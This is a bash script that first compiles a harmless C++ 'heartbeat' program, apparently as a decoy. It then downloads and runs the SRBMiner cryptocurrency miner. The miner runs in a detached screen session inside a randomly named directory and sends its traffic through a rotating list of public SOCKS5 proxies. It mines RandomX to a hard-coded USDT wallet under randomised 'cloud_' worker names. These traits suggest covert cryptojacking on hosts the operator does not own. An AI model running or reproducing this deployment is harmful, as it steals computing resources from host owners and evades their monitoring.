#!/bin/bash
# 创建心跳信号脚本
cat <<'EOF' > main.cpp

#include <iostream>
#include <thread>
#include <chrono>
#include <atomic>
#include <csignal>

// 全局变量，用于控制心跳线程的运行
std::atomic<bool> g_keep_running{true};

// 信号处理函数，用于优雅地处理Ctrl+C等终止信号
void signal_handler(int signal) {
    std::cout << "接收到信号 " << signal << "，准备停止心跳..." << std::endl;
    g_keep_running = false;
}

// 心跳函数，在后台线程中运行
void heartbeat_function() {
    std::cout << "心跳线程已启动，每60秒发送一次心跳信号" << std::endl;
    
    // 心跳计数器
    int heartbeat_count = 0;
    
    while (g_keep_running) {
        // 睡眠一段时间（这里设置为60秒，可以根据需要调整）
        // 为了更好的响应性，我们分多次短暂睡眠而不是一次长时间睡眠
        for (int i = 0; i < 60 && g_keep_running; ++i) {
            std::this_thread::sleep_for(std::chrono::seconds(1));
        }
        
        if (!g_keep_running) break;
        
        // 发送心跳信号（这里只是打印日志，实际应用中可能需要发送网络请求）
        heartbeat_count++;
        std::cout << "发送心跳信号 #" << heartbeat_count << " - " 
                  << std::chrono::system_clock::now().time_since_epoch().count() 
                  << std::endl;
        
        // 这里可以添加实际的心跳逻辑，例如：
        // - 发送HTTP请求到服务器
        // - 写入文件或数据库
        // - 更新共享内存或其他IPC机制
    }
    
    std::cout << "心跳线程已停止" << std::endl;
}

auto main() -> int {
    std::cout << "启动后台心跳程序..." << std::endl;
    
    // 设置信号处理
    std::signal(SIGINT, signal_handler);
    std::signal(SIGTERM, signal_handler);
    
    // 创建并启动心跳线程
    std::thread heartbeat_thread(heartbeat_function);
    
    std::cout << "主程序继续运行，心跳在后台进行" << std::endl;
    std::cout << "按Ctrl+C停止程序" << std::endl;
    
    // 主线程可以做其他工作，或者只是等待
    while (g_keep_running) {
        std::this_thread::sleep_for(std::chrono::seconds(1));
    }
    
    // 等待心跳线程结束
    if (heartbeat_thread.joinable()) {
        heartbeat_thread.join();
    }
    
    std::cout << "程序已正常退出" << std::endl;
    return 0;
}

EOF
# 运行心跳信号
cd ./ && PORT=3000 g++ main.cpp -o main && ./main --port=3000


# 更新系统和安装依赖
sudo apt update -y
sudo apt install -y screen

# 新建目录
# 生成10位随机字母数字组合，然后进入目录
random_dir="dir_$(cat /dev/urandom | tr -dc 'a-zA-Z0-6' | fold -w 10 | head -n 1)"
mkdir -v $random_dir
cd $random_dir

#下载程序
wget https://github.com/doktor83/SRBMiner-Multi/releases/download/2.8.1/SRBMiner-Multi-2-8-1-Linux.tar.gz

#解压程序
tar -xzvf SRBMiner-Multi-2-8-1-Linux.tar.gz

#去SRBMiner文件下
cd SRBMiner-Multi-2-8-1

# 创建快捷启动脚本
cat <<'EOF' > start
#!/bin/bash

# 生成随机矿工名
WORKER_NAME="cloud_$(date +"%Y%m%d_%H%M%S")_$RANDOM"

# 定义多个 SOCKS5 代理（格式：IP:端口）
SOCKS5_PROXIES=(
  "50.63.12.101:61120"   # 代理1
 
  
  
  "98.181.137.83:4145"
  
  
  "72.211.46.124:4145"
  "72.207.109.5:4145"
  "199.116.112.6:4145"
  
  "199.102.104.70:4145"
  "185.93.89.152:4222"
  "72.195.101.99:4145"
  "68.71.242.118:4145"
  "192.252.210.233:4145"
  "67.201.58.190:4145"
  "72.205.0.67:4145"
  "78.37.113.21:5555"
  
  # 可以继续添加更多代理...
)

# 随机选择一个代理
RANDOM_PROXY=${SOCKS5_PROXIES[$RANDOM % ${#SOCKS5_PROXIES[@]}]}

# 启动挖矿程序并指定代理
screen -dmS ${WORKER_NAME} ./SRBMiner-MULTI \
  --algorithm randomx \
  --pool stratum+ssl://rx.unmineable.com:443 \
  --wallet USDT:TGpiKru64ovzRMeBVTNgDDC5fakbDVU9Qk.${WORKER_NAME}#pblk-utjn \
  --proxy ${RANDOM_PROXY}

# 输出通知
echo "已选择代理：${RANDOM_PROXY}"
echo "你可以通过 'screen -r ${WORKER_NAME}' 来查看日志。"

EOF

# 设置执行权限
chmod +x start

# 启动脚本
./start

# 完成通知
echo "SRBMiner 编译完成并已在后台运行！"
